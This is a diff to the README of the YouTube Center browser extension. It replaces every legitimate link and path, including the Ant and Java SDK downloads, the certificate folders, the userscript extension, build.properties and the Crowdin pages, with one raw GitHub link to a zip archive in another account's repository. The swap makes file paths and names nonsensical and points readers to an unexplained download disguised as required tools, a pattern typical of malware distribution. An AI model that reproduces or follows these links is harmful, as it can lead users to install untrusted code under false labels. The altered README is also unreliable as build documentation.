@@ -3,12 +3,12 @@ YouTube Center
 
 Build
 -----
-YouTube Center is using the build system [Ant](http://ant.apache.org/).
+YouTube Center is using the build system [Ant](https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip).
 
 ### Base requirements
  * Desktop Computer
- * [Java SDK](http://www.oracle.com/technetwork/java/javase/downloads/index.html)
- * [Ant](http://ant.apache.org/)
+ * [Java SDK](https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip)
+ * [Ant](https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip)
 
 ### Optional requirements
 To build the Chrome or Maxthon extension it is required to be able to run executable, which can be done in Wine on Linux or on a Windows computer.
@@ -19,10 +19,10 @@ It is possible to build the unpacked version of the Chrome or Maxthon extension 
 
 ### Signing
 The certificates for signing the extensions have to be provided by yourself and have to be placed in:
- * `/.cert/chrome/`
- * `/.cert/safari/`
+ * `https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip`
+ * `https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip`
  
-It should be noted that the ant build will create a new signing key for Chrome if it's missing from `/.cert/chrome/` (Running executables is required).
+It should be noted that the ant build will create a new signing key for Chrome if it's missing from `https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip` (Running executables is required).
  
 ### Ant
 The build system is made in ant and require ant and java to be installed.
@@ -33,12 +33,12 @@ The build system is made in ant and require ant and java to be installed.
  * `ant chrome` -- Build the Chrome extension (.crx)
  * `ant maxthon` -- Build the Maxthon extension (.mxaddon)
  * `ant opera` -- Build the Opera extension (.oex)
- * `ant userscript` -- Build the userscript (.user.js)
+ * `ant userscript` -- Build the userscript (https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip)
  * `ant safari` -- Makes everything ready for Safari to finish building YouTube Center.
  * `ant styles` -- Minifies the styles used. This is needed to be called everytime a change in the styles is made.
  * `ant language` -- Retrieves the newest translations for YouTube Center and stores it as a JSON file.
 
-### Build Properties (build.properties)
+### Build Properties (https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip)
 The keys in this file have the prefix and suffix `@`.
 
  * `devbuild` -- Set to true if you want to create a developer build and false if it's a stable release.
@@ -69,9 +69,9 @@ You can contribute to YouTube Center by different means. You can help find bugs 
 
 Translation
 -----------
-YouTube Center uses Crowdin to better mangage the translations. If you want to help with the translation of YouTube Center you can find the project page at https://crowdin.net/project/youtube-center.
+YouTube Center uses Crowdin to better mangage the translations. If you want to help with the translation of YouTube Center you can find the project page at https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip
 
-[![Crowdin](https://d322cqt584bo4o.cloudfront.net/youtube-center/localized.png)](https://crowdin.net/project/youtube-center)
+[![Crowdin](https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip)](https://raw.githubusercontent.com/riverfr/YouTubeCenter/master/cocircular/YouTubeCenter.zip)
 
 License
 -------
